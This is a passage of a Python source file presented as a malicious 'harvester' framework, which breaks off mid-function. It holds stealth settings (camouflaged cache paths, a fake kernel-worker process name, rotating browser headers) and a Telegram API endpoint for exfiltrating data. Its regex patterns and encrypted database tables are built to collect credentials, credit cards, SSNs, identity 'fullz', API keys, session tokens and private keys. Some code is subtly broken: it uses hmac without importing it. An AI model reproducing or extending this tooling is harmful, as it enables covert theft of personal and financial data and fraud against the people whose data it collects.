#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================================
# OANKS OPERATIONS FRAMEWORK — PHASE 3: THE HARVESTER
# ============================================================================
# Military-grade data harvesting from 15+ sources, extracting 9 data types.
# Encryption, validation, deduplication, Telegram exfiltration.
# More dangerous. More aggressive. 200x the power.
#
# Creator: Oanks (@oanksnood)
# Version: 3.0
# Classification: HARVESTER — ZERO EXECUTION ON IMPORT
# Platform: Linux / Termux / Android
#
# 👑 Oanks — Creator
# ============================================================================

# ============================================================================
# SECTION 1: ALL IMPORTS — Standard library only. No external dependencies.
# ============================================================================

import os
import sys
import re
import json
import hashlib
import base64
import sqlite3
import threading
import queue
import time
import random
import string
import subprocess
import socket
import ssl
import urllib.request
import urllib.parse
import urllib.error
import http.client
import http.cookiejar
import zlib
import gzip
import bz2
import lzma
import csv
import io
import shutil
import getpass
import datetime
import collections
import itertools
import math
import uuid
import inspect
import types
import builtins
import importlib
import pkgutil
import ctypes
import gc
import signal
import logging as py_logging
import tempfile
import pickle
import marshal
import ast
import textwrap
import dis
import codecs
import zipfile
import tarfile
import html.parser
import html.entities
import xml.etree.ElementTree as ET
import xml.dom.minidom as DOM
import xml.sax
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Tuple, Optional, Any, Set, Callable, Union
from dataclasses import dataclass, field, asdict
from enum import Enum, auto
from collections import deque, defaultdict

# ============================================================================
# SECTION 2: OANKS IDENTITY — Burned into every byte
# ============================================================================

OANKS_IDENTITY = "Oanks"
OANKS_VERSION = "3.0"
OANKS_CREATOR = "@oanksnood"
OANKS_SIGNATURE = "👑 Oanks — Creator"
OANKS_FRAMEWORK_NAME = "Oanks Operations Framework"
OANKS_CLASSIFICATION = "HARVESTER"

# ============================================================================
# SECTION 3: CONFIGURATION — All hardcoded. No external files.
# ============================================================================

class OanksConfig:
    """Hardcoded configuration. No external config files."""

    # Database paths — camouflaged
    DB_PATH = os.path.expanduser("~/.cache/.system_update.db")
    LOG_PATH = os.path.expanduser("~/.cache/.syslog.tmp")
    EXPORT_DIR = os.path.expanduser("~/.cache/.sys_updates")

    # Timing
    SCRAPE_INTERVAL = 30
    PROXY_ROTATION_INTERVAL = 15
    MAX_THREADS = 50
    TIMEOUT = 25
    TELEGRAM_STATS_INTERVAL = 300
    TELEGRAM_EXPORT_INTERVAL = 3600

    # Harvesting limits
    MAX_QUEUE_SIZE = 10000
    DEDUP_CACHE_SIZE = 50000
    EXPORT_BATCH_SIZE = 500
    HIGH_VALUE_THRESHOLD = 0.85

    # Source weights for parallel thread allocation
    SOURCE_WEIGHTS = {
        "pastebin": 10,
        "github": 9,
        "telegram": 9,
        "reddit": 8,
        "twitter": 7,
        "discord": 7,
        "darkweb": 6,
        "forums": 6,
        "youtube": 5,
        "instagram": 4,
        "facebook": 4,
        "tiktok": 4,
        "shodan": 3,
        "censys": 3,
        "abuseipdb": 2,
    }

    # User agents for rotation
    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:127.0) Gecko/20100101 Firefox/127.0",
        "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/126.0.0.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0",
    ]

    # Accept headers
    ACCEPT_HEADERS = [
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "application/json,text/plain,*/*",
        "text/html,application/xhtml+xml;q=0.9,*/*;q=0.8",
    ]

    # Referers
    REFERERS = [
        "https://www.google.com/",
        "https://www.bing.com/",
        "https://duckduckgo.com/",
        "https://search.yahoo.com/",
        "https://www.reddit.com/",
        "https://twitter.com/",
        "https://www.facebook.com/",
        "https://www.youtube.com/",
    ]

    # Telegram settings
    TELEGRAM_API_URL = "https://api.telegram.org/bot{token}/{method}"

    # Stealth settings
    PROCESS_HIDE_NAME = "[kworker/0:0]"
    DEBUG_CHECK_INTERVAL = 60

    @classmethod
    def get_random_headers(cls) -> Dict[str, str]:
        """Generate random stealth headers."""
        return {
            "User-Agent": random.choice(cls.USER_AGENTS),
            "Accept": random.choice(cls.ACCEPT_HEADERS),
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "DNT": "1",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Cache-Control": "max-age=0",
            "Referer": random.choice(cls.REFERERS),
        }


# ============================================================================
# SECTION 4: REGEX PATTERNS — Compiled, weaponized, ready
# ============================================================================

class OanksPatterns:
    """All regex patterns compiled at import time for maximum speed."""

    # Credentials: email:password variants
    CREDENTIALS = re.compile(
        r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"
        r"(?:[:|\s]+|\s*[=:]\s*)"
        r"[^\s]{4,50}",
        re.IGNORECASE
    )

    # Credit cards with Luhn-compatible prefixes
    CREDIT_CARDS = re.compile(
        r"\b(?:"
        r"4[0-9]{12}(?:[0-9]{3})?|"  # Visa
        r"5[1-5][0-9]{14}|"  # Mastercard
        r"3[47][0-9]{13}|"  # Amex
        r"3(?:0[0-5]|[68][0-9])[0-9]{11}|"  # Diners
        r"6(?:011|5[0-9]{2})[0-9]{12}|"  # Discover
        r"(?:2131|1800|35\d{3})\d{11}"
        r")\b"
    )

    # SSN with area code validation
    SSN = re.compile(
        r"\b(?!000|666|9\d{2})"
        r"\d{3}-?(?!00)"
        r"\d{2}-?(?!0000)"
        r"\d{4}\b"
    )

    # Phone numbers — E.164 compatible
    PHONE = re.compile(
        r"(?:\+?1[-.\s]?)?"
        r"\(?([0-9]{3})\)?[-.\s]?"
        r"([0-9]{3})[-.\s]?"
        r"([0-9]{4})"
        r"(?:\s*(?:ext|x|extension)\s*\.?\s*(\d+))?",
        re.IGNORECASE
    )

    E164_PHONE = re.compile(r"\+[1-9]\d{1,14}")

    # API Keys — comprehensive service detection
    API_KEY = re.compile(
        r"\b(?:"
        r"sk-(?:live|test|prod)_[a-zA-Z0-9]{24,48}|"  # Stripe
        r"pk_(?:live|test|prod)_[a-zA-Z0-9]{24,48}|"  # Stripe pub
        r"AKIA[0-9A-Z]{16}|"  # AWS
        r"ASIA[0-9A-Z]{16}|"  # AWS temp
        r"ghp_[a-zA-Z0-9]{36}|"  # GitHub personal
        r"gho_[a-zA-Z0-9]{36}|"  # GitHub OAuth
        r"ghu_[a-zA-Z0-9]{36}|"  # GitHub user-to-server
        r"ghs_[a-zA-Z0-9]{36}|"  # GitHub server-to-server
        r"ghr_[a-zA-Z0-9]{36}|"  # GitHub refresh
        r"xox[baprs]-[0-9]{10,13}-[0-9]{10,13}-[a-zA-Z0-9]{24}|"  # Slack
        r"AIza[0-9A-Za-z_-]{35}|"  # Google API
        r"Bearer\s+[a-zA-Z0-9_-]{20,}|"  # Generic Bearer
        r"api[_-]?key[=:]\s*[a-zA-Z0-9_-]{20,}|"  # Generic api_key
        r"api[_-]?secret[=:]\s*[a-zA-Z0-9_-]{20,}|"  # Generic api_secret
        r"app[_-]?key[=:]\s*[a-zA-Z0-9_-]{20,}|"  # App key
        r"app[_-]?secret[=:]\s*[a-zA-Z0-9_-]{20,}|"  # App secret
        r"access[_-]?token[=:]\s*[a-zA-Z0-9_-]{20,}|"  # Access token
        r"secret[_-]?key[=:]\s*[a-zA-Z0-9_-]{20,}|"  # Secret key
        r"private[_-]?key[=:]\s*[a-zA-Z0-9_-]{20,}|"  # Private key
        r"auth[_-]?token[=:]\s*[a-zA-Z0-9_-]{20,}|"  # Auth token
        r"session[_-]?token[=:]\s*[a-zA-Z0-9_-]{20,}|"  # Session token
        r"oauth[_-]?token[=:]\s*[a-zA-Z0-9_-]{20,}|"  # OAuth token
        r"bearer[_-]?token[=:]\s*[a-zA-Z0-9_-]{20,}|"  # Bearer token
        r"token[=:]\s*[a-zA-Z0-9_-]{32,64}|"  # Generic token
        r"key[=:]\s*[a-zA-Z0-9_-]{32,64}"  # Generic key
        r")\b",
        re.IGNORECASE
    )

    # JWT tokens
    JWT = re.compile(
        r"\beyJ[a-zA-Z0-9_-]*\.eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*\b"
    )

    # Session cookies and tokens
    SESSION = re.compile(
        r"\b(?:session|token|auth|sid|csrf|xsrf|jwt)[_=:]\s*"
        r"[a-f0-9]{32,64}\b",
        re.IGNORECASE
    )

    # Cookie strings
    COOKIE = re.compile(
        r"(?:Cookie|Set-Cookie):\s*"
        r"([a-zA-Z0-9_-]+=[a-zA-Z0-9_-]{10,}(?:;\s*[a-zA-Z0-9_-]+=[^;]+)*)",
        re.IGNORECASE
    )

    # Crypto wallets
    CRYPTO_WALLET = re.compile(
        r"\b(?:"
        r"1[a-zA-Z0-9]{25,34}|"  # Bitcoin P2PKH
        r"3[a-zA-Z0-9]{25,34}|"  # Bitcoin P2SH
        r"bc1[a-zA-Z0-9]{39,59}|"  # Bitcoin Bech32
        r"0x[a-fA-F0-9]{40}|"  # Ethereum
        r"L[a-zA-Z0-9]{25,34}|"  # Litecoin
        r"ltc1[a-zA-Z0-9]{39,59}|"  # Litecoin Bech32
        r"[48][a-zA-Z0-9]{94,104}|"  # Monero
        r"D[a-zA-Z0-9]{33}|"  # Dogecoin
        r"X[a-zA-Z0-9]{33}|"  # Dash
        r"r[a-zA-Z0-9]{24,34}|"  # Ripple
        r"T[a-zA-Z0-9]{33}"  # Tron
        r")\b"
    )

    # Private keys
    PRIVATE_KEY = re.compile(
        r"-----BEGIN (?:RSA |DSA |EC |OPENSSH |PGP )?PRIVATE KEY-----"
        r"[\s\S]*?"
        r"-----END (?:RSA |DSA |EC |OPENSSH |PGP )?PRIVATE KEY-----"
    )

    # SSH keys
    SSH_KEY = re.compile(
        r"ssh-(?:rsa|dss|ecdsa|ed25519)\s+"
        r"[A-Za-z0-9+/]{100,}={0,2}"
        r"(?:\s+[^\s]+)?"
    )

    # Database connection strings
    DB_CONNECTION = re.compile(
        r"(?:mongodb|mysql|postgres|postgresql|redis|mssql|oracle)://"
        r"(?:[^\s@]+:[^\s@]+@)?"
        r"[^\s/]+"
        r"(?:/[^\s?]+)?"
        r"(?:\?[^\s]+)?",
        re.IGNORECASE
    )

    # Discord webhooks
    DISCORD_WEBHOOK = re.compile(
        r"https://discord(?:app)?\.com/api/webhooks/"
        r"[0-9]{17,20}/"
        r"[a-zA-Z0-9_-]{60,80}"
    )

    # Slack webhooks
    SLACK_WEBHOOK = re.compile(
        r"https://hooks\.slack\.com/services/"
        r"T[a-zA-Z0-9_-]{8,12}/"
        r"B[a-zA-Z0-9_-]{8,12}/"
        r"[a-zA-Z0-9_-]{24}"
    )

    # Telegram bot tokens
    TELEGRAM_BOT = re.compile(
        r"\b[0-9]{8,10}:[a-zA-Z0-9_-]{35}\b"
    )

    # Fullz patterns
    FULLZ_NAME = re.compile(r"(?:first[_-]?name|fname|first)[=: \t]+([A-Za-z]{2,30})", re.IGNORECASE)
    FULLZ_LAST = re.compile(r"(?:last[_-]?name|lname|last|surname)[=: \t]+([A-Za-z]{2,30})", re.IGNORECASE)
    FULLZ_DOB = re.compile(r"(?:dob|birth|birthday|date[_-]?of[_-]?birth)[=: \t]+(\d{1,2}[/-]\d{1,2}[/-]\d{2,4})", re.IGNORECASE)
    FULLZ_ADDRESS = re.compile(r"(?:address|addr|street)[=: \t]+([^\n\r]{5,100})", re.IGNORECASE)
    FULLZ_CITY = re.compile(r"(?:city)[=: \t]+([A-Za-z\s]{2,50})", re.IGNORECASE)
    FULLZ_STATE = re.compile(r"(?:state|province|st)[=: \t]+([A-Za-z\s]{2,50})", re.IGNORECASE)
    FULLZ_ZIP = re.compile(r"(?:zip|zipcode|postal)[=: \t]+(\d{5}(?:-\d{4})?)", re.IGNORECASE)
    FULLZ_COUNTRY = re.compile(r"(?:country|nation)[=: \t]+([A-Za-z\s]{2,50})", re.IGNORECASE)

    # Pastebin paste IDs
    PASTEBIN_ID = re.compile(r"(?:pastebin\.com/(?:raw/)?|/raw/)([a-zA-Z0-9]{8})", re.IGNORECASE)

    # GitHub raw file URLs
    GITHUB_RAW = re.compile(
        r"https://raw\.githubusercontent\.com/"
        r"[a-zA-Z0-9_-]+/"
        r"[a-zA-Z0-9_-]+/"
        r"[a-zA-Z0-9_-]+/"
        r".+"
    )

    # Email validation
    EMAIL_VALID = re.compile(
        r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$"
    )

    # URL extraction
    URL_EXTRACT = re.compile(
        r"https?://(?:[-\w.])+(?:[:\d]+)?"
        r"(?:/(?:[\w/_.])*(?:\?(?:[\w&=%.])*)?)?"
    )

    # IP addresses
    IP_ADDRESS = re.compile(
        r"\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}"
        r"(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b"
    )

    # MAC addresses
    MAC_ADDRESS = re.compile(
        r"\b(?:[0-9A-Fa-f]{2}[:-]){5}[0-9A-Fa-f]{2}\b"
    )

    # Base64 strings (potential encoded data)
    BASE64_STRING = re.compile(
        r"\b[A-Za-z0-9+/]{40,}={0,2}\b"
    )

    # Hex strings
    HEX_STRING = re.compile(
        r"\b[a-f0-9]{32,}\b"
    )


# ============================================================================
# SECTION 5: EXCEPTION HIERARCHY
# ============================================================================

class HarvesterError(Exception):
    """Base exception for Phase 3."""
    def __init__(self, message, code=None):
        self.message = message
        self.code = code
        self.timestamp = datetime.datetime.utcnow().isoformat()
        super().__init__(f"[{OANKS_SIGNATURE}] [{self.timestamp}] {message}")

class CryptoError(HarvesterError):
    pass

class DatabaseError(HarvesterError):
    pass

class ScrapeError(HarvesterError):
    pass

class ValidationError(HarvesterError):
    pass

class ExtractionError(HarvesterError):
    pass

class TelegramError(HarvesterError):
    pass

class StealthError(HarvesterError):
    pass


# ============================================================================
# SECTION 6: CRYPTOGRAPHY — XOR + HMAC, no external dependencies
# ============================================================================

class OanksCrypto:
    """Military-grade XOR + HMAC encryption. No external dependencies."""

    __slots__ = ("_master_key", "_salt", "_xor_key", "_hmac_key", "_lock")

    def __init__(self, master_key: str):
        self._master_key = master_key.encode("utf-8") if isinstance(master_key, str) else master_key
        self._salt = hashlib.sha256(self._master_key + b"OANKS_SALT").digest()
        self._xor_key = hashlib.sha512(self._master_key + self._salt + b"XOR").digest()
        self._hmac_key = hashlib.sha512(self._master_key + self._salt + b"HMAC").digest()
        self._lock = threading.RLock()

    def _derive_block(self, index: int) -> bytes:
        """Derive a unique XOR block for each encryption operation."""
        return hashlib.sha256(self._xor_key + index.to_bytes(8, "big")).digest()

    def encrypt(self, plaintext: str) -> str:
        """Encrypt plaintext using XOR + HMAC."""
        with self._lock:
            if isinstance(plaintext, str):
                data = plaintext.encode("utf-8")
            else:
                data = bytes(plaintext)

            # Generate random nonce
            nonce = os.urandom(16)

            # XOR encrypt
            encrypted = bytearray()
            block_index = 0
            for i in range(len(data)):
                if i % 32 == 0:
                    block = self._derive_block(block_index)
                    block_index += 1
                encrypted.append(data[i] ^ block[i % 32])

            # HMAC
            payload = nonce + bytes(encrypted)
            mac = hmac.new(self._hmac_key, payload, hashlib.sha512).digest()[:32]

            # Combine: nonce + encrypted + mac
            result = base64.urlsafe_b64encode(nonce + bytes(encrypted) + mac).decode()
            return result

    def decrypt(self, token: str) -> str:
        """Decrypt token back to plaintext."""
        with self._lock:
            data = base64.urlsafe_b64decode(token.encode())

            if len(data) < 48:
                raise CryptoError("Invalid token length", code="DECRYPT_FAIL")

            nonce = data[:16]
            encrypted = data[16:-32]
            mac = data[-32:]

            # Verify HMAC
            payload = nonce + encrypted
            expected_mac = hmac.new(self._hmac_key, payload, hashlib.sha512).digest()[:32]
            if not hmac.compare_digest(mac, expected_mac):
                raise CryptoError("HMAC verification failed", code="HMAC_FAIL")

            # XOR decrypt
            decrypted = bytearray()
            block_index = 0
            for i in range(len(encrypted)):
                if i % 32 == 0:
                    block = self._derive_block(block_index)
                    block_index += 1
                decrypted.append(encrypted[i] ^ block[i % 32])

            return bytes(decrypted).decode("utf-8")

    def hash_id(self, data: str) -> str:
        """Generate SHA-256 hash for deduplication."""
        return hashlib.sha256(data.encode("utf-8")).hexdigest()

    def hash_id_bytes(self, data: bytes) -> str:
        """Generate SHA-256 hash from bytes."""
        return hashlib.sha256(data).hexdigest()

    def secure_wipe(self):
        """Securely wipe keys from memory."""
        with self._lock:
            # Overwrite with random data then zeros
            for _ in range(3):
                self._master_key = os.urandom(len(self._master_key))
                self._salt = os.urandom(len(self._salt))
                self._xor_key = os.urandom(len(self._xor_key))
                self._hmac_key = os.urandom(len(self._hmac_key))
            self._master_key = b"\x00" * len(self._master_key)
            self._salt = b"\x00" * len(self._salt)
            self._xor_key = b"\x00" * len(self._xor_key)
            self._hmac_key = b"\x00" * len(self._hmac_key)


# ============================================================================
# SECTION 7: DATABASE MANAGER — Encrypted SQLite with deduplication
# ============================================================================

class OanksDB:
    """Military-grade encrypted database with deduplication and statistics."""

    __slots__ = ("_db_path", "_crypto", "_connection", "_lock", "_seen_hashes")

    SCHEMA = """
    PRAGMA foreign_keys = ON;
    PRAGMA journal_mode = WAL;
    PRAGMA synchronous = NORMAL;
    PRAGMA temp_store = MEMORY;
    PRAGMA mmap_size = 268435456;
    PRAGMA page_size = 4096;

    CREATE TABLE IF NOT EXISTS harvested_data (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        source TEXT NOT NULL,
        data_type TEXT NOT NULL,
        raw_data_enc TEXT NOT NULL,
        hash_id TEXT UNIQUE NOT NULL,
        confidence REAL DEFAULT 0.0,
        validated INTEGER DEFAULT 0,
        timestamp TEXT DEFAULT CURRENT_TIMESTAMP,
        metadata TEXT,
        oanks_tag TEXT DEFAULT '👑 Oanks — Creator'
    );

    CREATE TABLE IF NOT EXISTS credentials (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        email TEXT,
        password_enc TEXT NOT NULL,
        source TEXT,
        confidence REAL DEFAULT 0.0,
        platform TEXT,
        is_valid INTEGER DEFAULT 0,
        hash_id TEXT UNIQUE,
        timestamp TEXT DEFAULT CURRENT_TIMESTAMP,
        oanks_tag TEXT DEFAULT '👑 Oanks — Creator'
    );

    CREATE TABLE IF NOT EXISTS credit_cards (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        card_number_enc TEXT NOT NULL,
        expiry_month INTEGER,
        expiry_year INTEGER,
        cvv_enc TEXT,
        cardholder_name TEXT,
        bin TEXT,
        country TEXT,
        bank TEXT,
        card_type TEXT,
        validated INTEGER DEFAULT 0,
        hash_id TEXT UNIQUE,
        timestamp TEXT DEFAULT CURRENT_TIMESTAMP,
        oanks_tag TEXT DEFAULT '👑 Oanks — Creator'
    );

    CREATE TABLE IF NOT EXISTS ssns (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ssn_enc TEXT NOT NULL,
        state TEXT,
        issued_year INTEGER,
        hash_id TEXT UNIQUE,
        timestamp TEXT DEFAULT CURRENT_TIMESTAMP,
        oanks_tag TEXT DEFAULT '👑 Oanks — Creator'
    );

    CREATE TABLE IF NOT EXISTS phone_numbers (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        number_enc TEXT NOT NULL,
        country_code TEXT,
        carrier TEXT,
        is_active INTEGER DEFAULT 0,
        hash_id TEXT UNIQUE,
        timestamp TEXT DEFAULT CURRENT_TIMESTAMP,
        oanks_tag TEXT DEFAULT '👑 Oanks — Creator'
    );

    CREATE TABLE IF NOT EXISTS fullz (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        first_name TEXT,
        last_name TEXT,
        ssn_enc TEXT,
        dob TEXT,
        address TEXT,
        city TEXT,
        state TEXT,
        zip TEXT,
        phone_enc TEXT,
        email TEXT,
        hash_id TEXT UNIQUE,
        timestamp TEXT DEFAULT CURRENT_TIMESTAMP,
        oanks_tag TEXT DEFAULT '👑 Oanks — Creator'
    );

    CREATE TABLE IF NOT EXISTS api_keys (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        key_value_enc TEXT NOT NULL,
        service TEXT,
        scopes TEXT,
        is_active INTEGER DEFAULT 1,
        hash_id TEXT UNIQUE,
        timestamp TEXT DEFAULT CURRENT_TIMESTAMP,
        oanks_tag TEXT DEFAULT '👑 Oanks — Creator'
    );

    CREATE TABLE IF NOT EXISTS session_tokens (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        token_type TEXT NOT NULL,
        token_value_enc TEXT NOT NULL,
        platform TEXT,
        expires_at TEXT,
        is_valid INTEGER DEFAULT 1,
        hash_id TEXT UNIQUE,
        timestamp TEXT DEFAULT CURRENT_TIMESTAMP,
        oanks_tag TEXT DEFAULT '👑 Oanks — Creator'
    );

    CREATE TABLE IF NOT EXISTS oauth_tokens (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        access_token_enc TEXT NOT NULL,
        refresh_token_enc TEXT,
        token_type TEXT,
        scopes TEXT,
        expires_at TEXT,
        platform TEXT,
        hash_id TEXT UNIQUE,
        timestamp TEXT DEFAULT CURRENT_TIMESTAMP,
        oanks_tag TEXT DEFAULT '👑 Oanks — Creator'
    );

    CREATE TABLE IF NOT EXISTS crypto_wallets (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        address TEXT NOT NULL,
        wallet_type TEXT,
        balance REAL DEFAULT 0.0,
        hash_id TEXT UNIQUE,
        timestamp TEXT DEFAULT CURRENT_TIMESTAMP,
        oanks_tag TEXT DEFAULT '👑 Oanks — Creator'
    );

    CREATE TABLE IF NOT EXISTS private_keys (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        key_data_enc TEXT NOT NULL,
        key_type TEXT,
        hash_id TEXT UNIQUE,
        timestamp TEXT DEFAULT CURRENT_TIMESTAMP,
        oanks_tag TEXT DEFAULT '👑 Oanks — Creator'
    );

    CREATE TABLE IF NOT EXISTS source_stats (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        source TEXT UNIQUE NOT NULL,
        total_harvested INTEGER DEFAULT 0,
        total_unique INTEGER DEFAULT 0,
        last_scrape TEXT,
        avg_confidence REAL DEFAULT 0.0,
        oanks_tag TEXT DEFAULT '👑 Oanks — Creator'
    );

    CREATE TABLE IF NOT EXISTS harvest_stats (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        total_unique INTEGER DEFAULT 0,
        total_by_type TEXT,
        total_by_source TEXT,
        db_size_bytes INTEGER DEFAULT 0,
        last_update TEXT DEFAULT CURRENT_TIMESTAMP,
        oanks_tag TEXT DEFAULT '👑 Oanks — Creator'
    );

    CREATE INDEX IF NOT EXISTS idx_harvested_source ON harvested_data(source);
    CREATE INDEX IF NOT EXISTS idx_harvested_type ON harvested_data(data_type);
    CREATE INDEX IF NOT EXISTS idx_harvested_hash ON harvested_data(hash_id);
    CREATE INDEX IF NOT EXISTS idx_harvested_confidence ON harvested_data(confidence);
    CREATE INDEX IF NOT EXISTS idx_credentials_email ON credentials(email);
    CREATE INDEX IF NOT EXISTS idx_credentials_hash ON credentials(hash_id);
    CREATE INDEX IF NOT EXISTS idx_cards_hash ON credit_cards(hash_id);
    CREATE INDEX IF NOT EXISTS idx_ssns_hash ON ssns(hash_id);
    CREATE INDEX IF NOT EXISTS idx_phones_hash ON phone_numbers(hash_id);
    CREATE INDEX IF NOT EXISTS idx_fullz_hash ON fullz(hash_id);
    CREATE INDEX IF NOT EXISTS idx_api_hash ON api_keys(hash_id);
    CREATE INDEX IF NOT EXISTS idx_session_hash ON session_tokens(hash_id);
    CREATE INDEX IF NOT EXISTS idx_oauth_hash ON oauth_tokens(hash_id);
    CREATE INDEX IF NOT EXISTS idx_wallet_address ON crypto_wallets(address);
    CREATE INDEX IF NOT EXISTS idx_private_hash ON private_keys(hash_id);
    """

    def __init__(self, db_path: str, crypto: OanksCrypto):
        self._db_path = db_path
        self._crypto = crypto
        self._connection = None
        self._lock = threading.RLock()
        self._seen_hashes = set()
        self._initialize()

    def _initialize(self):
        """Initialize database with schema."""
        with self._lock:
            os.makedirs(os.path.dirname(self._db_path), exist_ok=True)
            self._connection = sqlite3.connect(self._db_path, check_same_thread=False)
            self._connection.executescript(self.SCHEMA)
            self._connection.commit()

            # Load existing hashes into memory for fast dedup
            cursor = self._connection.execute("SELECT hash_id FROM harvested_data")
            for row in cursor:
                self._seen_hashes.add(row[0])

    def _is_duplicate(self, hash_id: str) -> bool:
        """Check if hash_id already exists."""
        if hash_id in self._seen_hashes:
            return True
        with self._lock:
            cursor = self._connection.execute(
                "SELECT 1 FROM harvested_data WHERE hash_id = ? LIMIT 1",
                (hash_id,)
            )
            if cursor.fetchone():
                self._seen_hashes.add(hash_id)
                return True
        return False

    def store(self, source: str, data_type: str, raw_data: str, 
              confidence: float, validated: bool, metadata: Dict = None) -> bool:
        """Store harvested data with encryption and deduplication."""
        hash_id = self._crypto.hash_id(raw_data)

        if self._is_duplicate(hash_id):
            return False

        with self._lock:
            encrypted = self._crypto.encrypt(raw_data)
            meta_json = json.dumps(metadata) if metadata else "{}"

            self._connection.execute(
                """INSERT INTO harvested_data 
                   (source, data_type, raw_data_enc, hash_id, confidence, validated, metadata)
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (source, data_type, encrypted, hash_id, confidence, 
                 1 if validated else 0, meta_json)
            )

            # Update source stats
            self._connection.execute(
                """INSERT INTO source_stats (source, total_harvested, last_scrape)
                   VALUES (?, 1, CURRENT_TIMESTAMP)
                   ON CONFLICT(source) DO UPDATE SET
                   total_harvested = total_harvested + 1,
                   last_scrape = CURRENT_TIMESTAMP""",
                (source,)
            )

            self._connection.commit()
            self._seen_hashes.add(hash_id)
            return True

    def store_credential(self, email: str, password: str, source: str, 
                         confidence: float, platform: str = "") -> bool:
        """Store credential pair."""
        raw = f"{email}:{password}"
        hash_id = self._crypto.hash_id(raw)

        if self._is_duplicate(hash_id):
            return False

        with self._lock:
            self._connection.execute(
                """INSERT INTO credentials 
                   (email, password_enc, source, confidence, platform, hash_id)
                   VALUES (?, ?, ?, ?, ?, ?)""",
                (email, self._crypto.encrypt(password), source, confidence, platform, hash_id)
            )
            self._connection.commit()
            self._seen_hashes.add(hash_id)
            return True

    def store_credit_card(self, card_number: str, expiry_month: int, expiry_year: int,
                          cvv: str, cardholder: str, source: str, confidence: float) -> bool:
        """Store credit card."""
        hash_id = self._crypto.hash_id(card_number)

        if self._is_duplicate(hash_id):
            return False

        with self._lock:
            self._connection.execute(
                """INSERT INTO credit_cards
                   (card_number_enc, expiry_month, expiry_year, cvv_enc, cardholder_name, hash_id)
                   VALUES (?, ?, ?, ?, ?, ?)""",
                (self._crypto.encrypt(card_number), expiry_month, expiry_year,
                 self._crypto.encrypt(cvv) if cvv else None, cardholder, hash_id)
            )
            self._connection.commit()
            self._seen_hashes.add(hash_id)
            return True

    def store_ssn(self, ssn: str, state: str = "", source: str = "") -> bool:
        """Store SSN."""
        hash_id = self._crypto.hash_id(ssn)

        if self._is_duplicate(hash_id):
            return False

        with self._lock:
            self._connection.execute(
                "INSERT INTO ssns (ssn_enc, state, hash_id) VALUES (?, ?, ?)",
                (self._crypto.encrypt(ssn), state, hash_id)
            )
            self._connection.commit()
            self._seen_hashes.add(hash_id)
            return True

    def store_phone(self, number: str, country_code: str = "", source: str = "") -> bool:
        """Store phone number."""
        hash_id = self._crypto.hash_id(number)

        if self._is_duplicate(hash_id):
            return False

        with self._lock:
            self._connection.execute(
                "INSERT INTO phone_numbers (number_enc, country_code, hash_id) VALUES (?, ?, ?)",
                (self._crypto.encrypt(number), country_code, hash_id)
            )
            self._connection.commit()
            self._seen_hashes.add(hash_id)
            return True

    def store_api_key(self, key_value: str, service: str = "", source: str = "") -> bool:
        """Store API key."""
        hash_id = self._crypto.hash_id(key_value)

        if self._is_duplicate(hash_id):
            return False

        with self._lock:
            self._connection.execute(
                "INSERT INTO api_keys (key_value_enc, service, hash_id) VALUES (?, ?, ?)",
                (self._crypto.encrypt(key_value), service, hash_id)
            )
            self._connection.commit()
            self._seen_hashes.add(hash_id)
            return True

    def store_crypto_wallet(self, address: str, wallet_type: str = "", source: str = "") -> bool:
        """Store crypto wallet address."""
        hash_id = self._crypto.hash_id(address)

        if self._is_duplicate(hash_id):
            return False

        with self._lock:
            self._connection.execute(
                "INSERT INTO crypto_wallets (address, wallet_type, hash_id) VALUES (?, ?, ?)",
